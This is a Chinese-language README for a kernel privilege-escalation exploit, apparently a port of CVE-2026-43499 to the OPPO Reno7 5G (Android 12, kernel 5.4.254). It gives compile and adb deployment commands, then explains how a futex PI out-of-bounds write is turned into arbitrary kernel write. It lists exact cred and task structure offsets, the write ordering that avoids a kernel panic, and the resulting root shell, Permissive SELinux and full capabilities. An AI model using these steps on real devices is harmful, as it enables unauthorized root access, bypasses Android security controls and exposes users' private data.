# GhostLock54 for OPPO Reno7 5G

针对 OPPO Reno7 5G（型号 `OP5227`）的 GhostLock（CVE-2026-43499）移植版。

目标内核：`5.4.254-qgki-gaa96eae94d32`，Android 12。

本程序通过 futex PI 越界写获得内核任意写原语，改写目标进程的 `cred` 字段，达到：

- 真实 `uid=0` / `gid=0`
- SELinux 切到 `Permissive`
- 为子进程的 `cred` 写入 capability 集合（`cap_effective` / `cap_permitted` / `cap_bset` / `cap_inheritable` / `cap_ambient` 全部置满）
- 清 `securebits`，避免 `execve` 时被 `SECURE_NOROOT` 清空 cap
- 通过现有 ADB 通道直接进入交互式 root shell，不开 TCP 端口

## 编译

需要 AArch64 clang 或 NDK（推荐使用 `-O3` 与 `armv8.2-a` 指令集加速采样）：

```sh
clang -O3 -march=armv8.2-a+crc -pthread ghostlock54.c -o ghostlock54
```

运行

```sh
adb push ghostlock54 /data/local/tmp/ghostlock54
adb shell chmod 755 /data/local/tmp/ghostlock54
adb shell -t /data/local/tmp/ghostlock54
```

支持预检模式（不触发越界写，不破坏内核状态）：

```sh
adb shell /data/local/tmp/ghostlock54 --leak-only
adb shell /data/local/tmp/ghostlock54 --leak-y-only
```

运行结果

成功进入 root shell，getenforce 输出 Permissive，grep Cap /proc/self/status 示例：

```
Uid:    0       0       0       0
CapInh: ffffffed7bfaffff
CapPrm: ffffffed7bfaffff
CapEff: ffffffed7bfaffff
CapBnd: ffffffed7bfaffff
CapAmb: ffffffed7bfaffff
```

· 低 16 位 0xffff 稳定有效（由 k_write_value | 0xffff 决定）
· 高位 bit 16..40 来自 k_write_value 的 KASLR 高位，每次重启随机

稳定可用的 cap：CAP_DAC_OVERRIDE、CAP_DAC_READ_SEARCH、CAP_FOWNER、CAP_FSETID、CAP_KILL、CAP_SETGID、CAP_SETUID、CAP_SETPCAP、CAP_LINUX_IMMUTABLE、CAP_NET_ADMIN、CAP_NET_RAW 等。

已验证可读 /data、/data/system/users/0.xml。

实现要点

越界写必须选可写地址

反汇编 rb_erase 可见写入路径末尾会 dereference 被写值：

```
ffffffc011705d58:  str x9, [x8, #8]     ; *(target) = value
ffffffc011705d5c:  cbz x9, #0xffffffc011705e04
ffffffc011705d60:  str x10, [x9]        ; *(value) = x10   <-- 会解引用
```

因此 value 必须是可读写内核地址。这里用 k_write_value = (__log_buf 上界 64 KiB 对齐) 作为底，再或上 0xffff 掩码，得到的 cap 位图低 16 位全 1，且 deref 落在 __log_buf 同一 64 KiB 页内，安全。

cred 字段偏移（由 cap_capable 反汇编交叉验证）

字段 偏移
cred->uid +0x04
cred->euid +0x14
cred->securebits +0x24
cred->cap_inheritable +0x28
cred->cap_permitted +0x30
cred->cap_effective +0x38
cred->cap_bset +0x40
cred->cap_ambient +0x48
cred->user_ns +0x88
task->real_cred +0x800
task->cred +0x808

写入顺序

rb_erase 也会读 *(target - 8) 作为 parent。写 cap 时必须按 +0x38 → +0x30 → +0x40 → +0x28 → +0x48 的顺序，确保每次读取的 parent 位置都还没被本次改写污染，否则会 deref 到刚写入的 cap 值直接 panic。

安全说明

· 仅针对上述设备/内核标定。换内核必须重新反汇编验证所有偏移和栈几何，否则极易 panic。
· 成功利用后，内核 PI 引用指向存活的工作线程内核栈。不要 kill 已 park 的父进程，否则 Y 线程栈释放，悬挂的 fake waiter 被别的进程取到会 panic。
· 错误兜底保护：如果 exploit 在任意阶段失败（例如 write_value 越界或 stamp 失败），父进程会直接进入 for(;;) pause(); 死循环挂起。这是为了防止父进程退出导致 Y 线程内核栈被释放而触发强制 Kernel Panic。遇到卡死直接重启手机即可。
· 恢复系统到正常状态只能靠重启（adb reboot）。
· 仅在你自己拥有或明确授权测试的设备上使用。

许可证

Apache License 2.0
